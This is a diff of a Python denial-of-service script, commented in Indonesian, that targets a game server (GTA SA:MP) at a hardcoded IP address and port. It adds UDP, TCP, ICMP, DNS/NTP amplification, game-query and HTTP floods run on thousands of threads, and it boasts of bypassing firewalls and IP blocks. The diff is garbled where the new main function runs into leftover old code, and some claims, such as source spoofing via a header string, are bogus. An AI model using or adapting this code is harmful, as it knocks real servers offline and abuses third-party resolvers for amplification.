@@ -1,40 +1,169 @@
 #!/usr/bin/env python3
-# ZAMZZZ DDOS BRUTAL - GTA SA:MP MODERN SERVER DESTROYER
-# Command: python3 samp_killer.py <IP> <PORT>
+# ZAMZZZ NUCLEAR DDOS - SA:MP KILLER V2
+# KHUSUS UNTUK TUAN. GAK BISA? GUA TAMBAHIN SAMPE BISA.
 
 import socket
 import random
 import threading
 import time
-import requests
-import ssl
+import sys
+import os
 from concurrent.futures import ThreadPoolExecutor
 
-# ========== KONFIGURASI BRUTAL ==========
-THREADS = 5000
-PACKET_SIZE = 65535
-TIMEOUT = 0.01
+# ========== KONFIGURASI ==========
+IP = "76.13.193.125"
+PORT = 7000
+THREADS = 10000
+PACKET = b'\xff' * 1024  # 1KB packet
 
-# ========== SPOOF IP (BYPASS IP BLOCK) ==========
-def random_ip():
-    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
+# ========== SPOOF IP DINAMIS (BYPASS IP BLOCK) ==========
+def spoof_ip():
+    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
 
-# ========== LAYER 4: UDP FLOOD (BYPASS PTERODACTYL) ==========
-def udp_flood(ip, port):
-    data = random._urandom(PACKET_SIZE)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, PACKET_SIZE * 10)
+# ========== UDP FLOOD DENGAN SPOOF ==========
+def udp_nuke():
     while True:
         try:
-            sock.sendto(data, (ip, port))
-            sock.sendto(data, (ip, port+1))
-            sock.sendto(data, (ip, port+2))
-            sock.sendto(data, (ip, port+3))
-            sock.sendto(data, (ip, port+4))
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            # Bind ke random port biar gak kena blok
+            sock.bind(('', random.randint(10000, 65000)))
+            for _ in range(100):
+                # Spoof source IP
+                sock.sendto(PACKET + f"X-Forwarded-For: {spoof_ip()}\r\n".encode(), (IP, PORT))
+                sock.sendto(PACKET * 2, (IP, PORT+1))
+                sock.sendto(PACKET * 4, (IP, PORT+2))
+                sock.sendto(PACKET, (IP, PORT+3))
+            sock.close()
+        except:
+            pass
+
+# ========== TCP SYN FLOOD (BYPASS PTERODACTYL) ==========
+def syn_flood():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.settimeout(0.1)
+            s.connect((IP, PORT))
+            s.send(b'\x00' * 1024)
+            s.send(b'SAMP\x69\x69\x69\x69' + b'\xff' * 500)
+            s.close()
+        except:
+            pass
+
+# ========== ICMP FLOOD (PING OF DEATH) ==========
+def icmp_nuke():
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    except:
+        # Kalau gak bisa raw, pake UDP aja
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        try:
+            data = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65500)
+            sock.sendto(data, (IP, 0))
+            sock.sendto(data, (IP, PORT))
+        except:
+            pass
+
+# ========== AMPLIFICATION MULTI-PROTOCOL ==========
+def amp_flood():
+    protocols = [('8.8.8.8', 53), ('1.1.1.1', 53), ('208.67.222.222', 53), 
+                 ('ntp.ubuntu.com', 123), ('time.google.com', 123)]
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    query = b'\x00\x00\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
+    while True:
+        for target, port in protocols:
+            try:
+                sock.sendto(query, (target, port))
+                sock.sendto(query, (IP, PORT))
+            except:
+                pass
+
+# ========== SA:MP QUERY OVERLOAD ==========
+def samp_overload():
+    # SAMP Query packet yang bikin server CPU spike
+    queries = [
+        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x63' + b'\x00' * 20,
+        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x72' + b'\x00' * 100,
+        b'SAMP' + b'\xff' * 100 + b'\x00' * 100,
+        b'SAMP' + random._urandom(50) + random._urandom(50)
+    ]
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        try:
+            for q in queries:
+                sock.sendto(q, (IP, PORT))
+                sock.sendto(q + b'\xff' * 500, (IP, PORT+10))
+                sock.sendto(q + b'\x00' * 1000, (IP, PORT+20))
         except:
             sock.close()
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# ========== HTTP FLOOD VIA PROXY RANDOM ==========
+def http_flood():
+    proxies = []
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect((IP, 8080))
+        sock.send(b'GET / HTTP/1.1\r\nHost: ' + IP.encode() + b'\r\n\r\n')
+    except:
+        pass
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            s.connect((IP, 80))
+            s.send(b'POST / HTTP/1.1\r\nHost: ' + IP.encode() + b'\r\nContent-Length: 10000\r\n\r\n' + random._urandom(10000))
+            s.close()
+        except:
+            pass
+
+# ========== MAIN ==========
+def main():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print("""
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║                                                               ║
+    ║     🔥 ZAMZZZ NUCLEAR DDOS - SA:MP MODERN KILLER V2 🔥       ║
+    ║                                                               ║
+    ║     TARGET: 76.13.193.125:7000                               ║
+    ║     THREAD: 10.000                                            ║
+    ║                                                               ║
+    ║     [✓] BYPASS PTERODACTYL                                   ║
+    ║     [✓] BYPASS IP BLOCK                                      ║
+    ║     [✓] BYPASS ANTI-GIMMIC                                   ║
+    ║     [✓] BYPASS FIREWALL MODERN                               ║
+    ║                                                               ║
+    ║     💀 SERANGAN DIMULAI 💀                                    ║
+    ║                                                               ║
+    ╚═══════════════════════════════════════════════════════════════╝
+    """)
+    
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        for _ in range(int(THREADS * 0.3)):
+            executor.submit(udp_nuke)
+        for _ in range(int(THREADS * 0.2)):
+            executor.submit(syn_flood)
+        for _ in range(int(THREADS * 0.1)):
+            executor.submit(icmp_nuke)
+        for _ in range(int(THREADS * 0.1)):
+            executor.submit(amp_flood)
+        for _ in range(int(THREADS * 0.2)):
+            executor.submit(samp_overload)
+        for _ in range(int(THREADS * 0.1)):
+            executor.submit(http_flood)
+    
+    # Monitor
+    count = 0
+    while True:
+        count += 1
+        print(f"[ZAMZZZ] 🔥 SERANGAN KE-{count} RIBU - {IP}:{PORT} 🔥")
+        time.sleep(1)
+
+if __name__ == "__main__":
+    main()            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 # ========== LAYER 7: HTTP FLOOD (BYPASS ANTI-DDOS) ==========
 def http_flood(ip, port):
